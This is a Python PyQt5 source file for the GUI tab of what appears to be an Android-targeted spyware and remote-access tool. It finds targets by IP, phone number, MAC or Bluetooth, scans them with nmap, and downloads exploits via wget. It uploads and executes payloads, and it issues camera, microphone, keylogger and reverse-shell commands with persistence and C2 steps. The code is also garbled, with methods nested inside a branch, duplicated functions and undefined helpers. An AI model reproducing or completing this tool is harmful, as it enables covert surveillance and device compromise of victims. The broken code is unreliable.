
from PyQt5.QtWidgets import QWidget, QCheckBox, QVBoxLayout

class AndroidTab(QWidget):
    def scan_all_devices(self):
        self.output.append("[+] Scanning for all devices...")
        # Scan Bluetooth devices
        try:
            self.scan_bluetooth()
        except Exception as e:
            self.output.append(f"[-] Bluetooth scan error: {str(e)}")
        # Scan network devices (IP)
        try:
            import requests
            # Example: scan local subnet
            subnet = "192.168.1.0/24"  # Adjust as needed
            self.output.append(f"[+] Scanning network: {subnet}")
            # This is a placeholder for actual network scan logic
            # You can use nmap or a custom API
            # For demonstration, query a public IP API
            response = requests.get("https://api.ipify.org?format=json")
            if response.status_code == 200:
                ip = response.json().get("ip", "Unknown")
                self.results_list.addItem(f"Network Device ({ip})")
        except Exception as e:
            self.output.append(f"[-] Network scan error: {str(e)}")
        # Optionally scan phone numbers
        try:
            query = self.search_input.text()
            if query:
                self.output.append(f"[+] Searching for Phone Number: {query}")
                response = requests.get(f"https://phone-api.com/search?number={query}")
                if response.status_code == 200:
                    results = response.json()
                    self.populate_results(results)
        except Exception as e:
            self.output.append(f"[-] Phone number scan error: {str(e)}")

    def __init__(self):
        super().__init__()
        from PyQt5.QtWidgets import QVBoxLayout, QHBoxLayout, QLineEdit, QComboBox, QPushButton, QLabel, QListWidget, QTextEdit
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.ip_input = QLineEdit()
        self.port_input = QLineEdit()
        self.cmd_input = QLineEdit()
        self.connected = False
        self.platform = "android"
        self.target_ip = None
        self.target_port = None

        # Platform-specific controls
        self.camera_checkbox = QCheckBox("Enable Camera Capture")
        self.microphone_checkbox = QCheckBox("Enable Microphone Capture")
        self.keylogger_checkbox = QCheckBox("Enable Keylogger")
        self.shell_checkbox = QCheckBox("Open Reverse Shell")

        # Target search section
        search_layout = QHBoxLayout()
        self.search_input = QLineEdit()
        self.search_types = QComboBox()
        self.search_types.addItems(["IP Address", "Phone Number", "MAC Address", "Bluetooth"])
        self.search_btn = QPushButton("Search")
        search_layout.addWidget(QLabel("Search By:"))
        search_layout.addWidget(self.search_types)
        search_layout.addWidget(self.search_input)
        search_layout.addWidget(self.search_btn)

        # Target results
        self.results_list = QListWidget()

        # Bluetooth search section
        bt_layout = QHBoxLayout()
        self.bt_scan_btn = QPushButton("Scan for Devices")
        self.bt_results = QListWidget()
        bt_layout.addWidget(self.bt_scan_btn)
        bt_layout.addWidget(self.bt_results)

        layout = QVBoxLayout()
        layout.addLayout(bt_layout)
        layout.addLayout(search_layout)
        layout.addWidget(self.camera_checkbox)
        layout.addWidget(self.microphone_checkbox)
        layout.addWidget(self.keylogger_checkbox)
        layout.addWidget(self.shell_checkbox)
        layout.addWidget(self.results_list)
        layout.addWidget(self.output)
        self.setLayout(layout)

        self.search_btn.clicked.connect(self.search_target)
        self.bt_scan_btn.clicked.connect(self.scan_bluetooth)

    def search_target(self):
        import requests
        query = self.search_input.text()
        search_type = self.search_types.currentText()
        self.output.append(f"[+] Searching for {search_type}: {query}")
        response = None
        if search_type == "Phone Number":
            clean_query = ''.join(c for c in query if c.isdigit())
            if len(clean_query) > 10:
                query = clean_query
            response = requests.get(f"https://phone-api.com/search?number={query}")
            def analyze_target(self, target_ip):
                services = self.scan_common_services(target_ip)
                os_type = self.identify_os(services)
                exploits = self.search_exploitdb(os_type, services)
                best_exploit = self.rank_exploits(exploits)
                return best_exploit

            def rank_exploits(self, exploits):
                sorted_exploits = sorted(exploits,
                                        key=lambda x: (x['score'], -x['difficulty'], x['is_remote']),
                                        reverse=True)
                return sorted_exploits[0] if sorted_exploits else None

            def execute_exploit(self, exploit):
                import requests
                target_ip = self.ip_input.text()
                payload_url = exploit['download_url']
                response = requests.get(payload_url)
                if exploit.get('needs_compilation'):
                    payload = self.compile_payload(response.content, exploit['compiler'])
                else:
                    payload = response.content
                success = self.deliver_payload(target_ip, payload)
                if success:
                    self.output.append(f"[+] Exploit {exploit['title']} successful")
                    self.connected = True
                else:
                    self.output.append(f"[-] Exploit {exploit['title']} failed")
                return success

            def deploy_spyware(self):
                target_ip = self.ip_input.text()
                primary_exploit = self.analyze_target(target_ip)
                if primary_exploit:
                    success = self.execute_exploit(primary_exploit)
                    if success:
                        return
                self.output.append("[-] Primary exploit failed, trying alternatives...")
                secondary_exploits = self.get_alternative_exploits()
                for exploit in secondary_exploits:
                    success = self.execute_exploit(exploit)
                    if success:
                        break
                if not self.connected:
                    self.output.append("[!] Manual deployment required")
                    self.show_manual_options()
        elif search_type == "IP Address":
            response = requests.get(f"https://ip-api.com/json/{query}")
        elif search_type == "MAC Address":
            response = requests.get(f"https://macvendors.com/query/{query}")
        elif search_type == "Bluetooth":
            self.scan_bluetooth()
            return
        if response:
            results = response.json()
            self.populate_results(results)

    def populate_results(self, results):
        self.results_list.clear()
        for item in results:
            self.results_list.addItem(f"{item['name']} ({item['type']})")
        self.results_list.itemClicked.connect(self.select_target)

    def select_target(self, item):
        target_info = item.text()
        self.ip_input.setText(target_info.split("(")[0].strip())
        self.output.append(f"[+] Selected target: {target_info}")
        self.scan_target()

    def scan_bluetooth(self):
        self.output.append("[+] Scanning for Bluetooth devices...")
        try:
            from bluetooth_scanner import BluetoothScanner, BLUETOOTH_AVAILABLE
            if not BLUETOOTH_AVAILABLE:
                self.output.append("[-] Bluetooth module not available. Please install pybluez on Kali Linux.")
                return
            scanner = BluetoothScanner()
            devices = scanner.discover_devices()
            self.bt_results.clear()
            for device in devices:
                self.bt_results.addItem(f"{device['name']} ({device['address']})")
            self.bt_results.itemClicked.connect(self.select_bluetooth_device)
        except Exception as e:
            self.output.append(f"[-] Bluetooth scan error: {str(e)}")

    def select_bluetooth_device(self, item):
        device_info = item.text()
        device_addr = device_info.split("(")[1].split(")")[0]
        self.output.append(f"[+] Selected Bluetooth device: {device_info}")
        self.scan_device(device_addr)

    def scan_device(self, device_addr):
        try:
            from bluetooth_scanner import BluetoothScanner, BLUETOOTH_AVAILABLE
            if not BLUETOOTH_AVAILABLE:
                self.output.append("[-] Bluetooth module not available. Please install pybluez on Kali Linux.")
                return
            scanner = BluetoothScanner()
            services = scanner.scan_device(device_addr)
            self.output.append(f"[+] Discovered services: {len(services)}")
            for service in services:
                self.output.append(f"  - {service['name']} ({service['protocol']})")
            if any(s['protocol'] in ['rfcomm', 'spp'] for s in services):
                self.output.append("[+] Found exploitable Bluetooth service")
                self.deploy_payload(device_addr, "bluetooth")
        except Exception as e:
            self.output.append(f"[-] Bluetooth device scan error: {str(e)}")

    def deploy_payload(self, device_addr, device_type):
        if device_type == "bluetooth":
            try:
                from bluetooth_scanner import BLUETOOTH_AVAILABLE
                if not BLUETOOTH_AVAILABLE:
                    self.output.append("[-] Bluetooth module not available. Please install pybluez on Kali Linux.")
                    return
                import bluetooth
                payload = self.create_bluetooth_payload()
                sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                sock.connect((device_addr, 1))
                sock.send(payload)
                sock.close()
                self.output.append("[+] Bluetooth payload sent successfully")
            except Exception as e:
                self.output.append(f"[-] Bluetooth payload delivery failed: {str(e)}")

    def deploy_spyware(self):
        # Scan target automatically
        payload_type = self.scan_target()
        # Install payload
        self.install_payload(payload_type)
        # Configure persistence
        self.setup_persistence()
        # Start C2 communication
        self.setup_c2()

    def install_payload(self, payload_type):
        import requests
        target_ip = self.ip_input.text()
        self.output.append(f"[+] Installing {payload_type} to {target_ip}...")
        try:
            with open(f"{payload_type}.bin", 'rb') as f:
                requests.post(f"http://{target_ip}:8080/upload", files={'payload': f})
            response = requests.post(f"http://{target_ip}:8080/exec")
            if response.status_code == 200:
                self.output.append("[+] Payload executed successfully")
                self.connected = True
            else:
                self.output.append(f"[-] Failed to execute payload: {response.text}")
        except Exception as e:
            self.output.append(f"[-] Payload install error: {str(e)}")

    def scan_target(self):
        import subprocess
        target_ip = self.ip_input.text()
        self.output.append(f"[+] Scanning {target_ip}...")
        result = subprocess.run(["nmap", "-sV", target_ip], capture_output=True, text=True)
        os_info = self.identify_os(result.stdout)
        services = self.identify_services(result.stdout)
        self.output.append(f"[+] Detected OS: {os_info}")
        self.output.append(f"[+] Detected Services: {', '.join(services)}")
        payload_type = self.generate_payload(os_info, services)
        self.output.append(f"[+] Generated payload type: {payload_type}")
        return payload_type

    def identify_os(self, scan_output):
        if "Android" in scan_output:
            return "Android"
        elif "iOS" in scan_output:
            return "iOS"
        elif "Windows" in scan_output:
            return "Windows"
        elif "macOS" in scan_output:
            return "macOS"
        return "Unknown"

    def generate_payload(self, os_type, services):
        import requests
        import subprocess
        exploit_url = f"https://exploit-db.com/search?platform={os_type}&services={','.join(services)}"
        response = requests.get(exploit_url)
        exploits = response.json()
        best_exploit = max(exploits, key=lambda x: x['score'])
        payload_url = best_exploit['url']
        subprocess.run(["wget", payload_url])
        return f"compiled_{os_type}_payload"

    def deliver_payload(self, target_ip, platform):
        import requests
        payload_path = f"{platform}_payload.py"
        try:
            with open(payload_path, 'rb') as f:
                response = requests.post(f"http://{target_ip}:8080/upload", files={'payload': f})
            if response.status_code == 200:
                self.output.append("[+] Payload delivered successfully")
            else:
                self.output.append(f"[-] Payload delivery failed: {response.status_code}")
        except Exception as e:
            self.output.append(f"[-] Payload delivery error: {str(e)}")

    def execute_command(self):
        cmd = self.cmd_input.text()
        if not cmd or not self.connected:
            return
        if cmd == "capture":
            self.capture_data()
        elif cmd == "keylog":
            self.start_keylogger()
        elif cmd == "shell":
            self.open_shell()

    def capture_data(self):
        import requests
        requests.post(f"http://{self.target_ip}:{self.target_port}/cmd", json={"action": "capture", "device": self.platform})

    def start_keylogger(self):
        import requests
        requests.post(f"http://{self.target_ip}:{self.target_port}/cmd", json={"action": "keylog", "device": self.platform})

    def open_shell(self):
        import requests
        requests.post(f"http://{self.target_ip}:{self.target_port}/cmd", json={"action": "shell", "device": self.platform})

    def connect_target(self):
        ip = self.ip_input.text()
        port = self.port_input.text()
        self.output.append(f"[+] Connecting to {ip}:{port}...")
        try:
            import requests
            response = requests.post(f"http://{ip}:{port}/install", json={"payload": "android_payload.py"})
            if response.status_code == 200:
                self.output.append("[+] Payload installed successfully")
                self.connected = True
        except Exception as e:
            self.output.append(f"[-] Connection failed: {str(e)}")
        def execute_command(self):
            cmd = self.cmd_input.text()
            if not cmd or not self.connected:
                return
            if cmd == "capture":
                self.capture_data()
            elif cmd == "keylog":
                self.start_keylogger()
            elif cmd == "shell":
                self.open_shell()

        def capture_data(self):
            import requests
            requests.post(f"http://{self.target_ip}:{self.target_port}/cmd", json={"action": "capture", "device": self.platform})

        def start_keylogger(self):
            import requests
            requests.post(f"http://{self.target_ip}:{self.target_port}/cmd", json={"action": "keylog", "device": self.platform})

        def open_shell(self):
            import requests
            requests.post(f"http://{self.target_ip}:{self.target_port}/cmd", json={"action": "shell", "device": self.platform})

        def connect_target(self):
            ip = self.ip_input.text()
            port = self.port_input.text()
            self.output.append(f"[+] Connecting to {ip}:{port}...")
            try:
                import requests
                response = requests.post(f"http://{ip}:{port}/install", json={"payload": "android_payload.py"})
                if response.status_code == 200:
                    self.output.append("[+] Payload installed successfully")
                    self.connected = True
            except Exception as e:
                self.output.append(f"[-] Connection failed: {str(e)}")
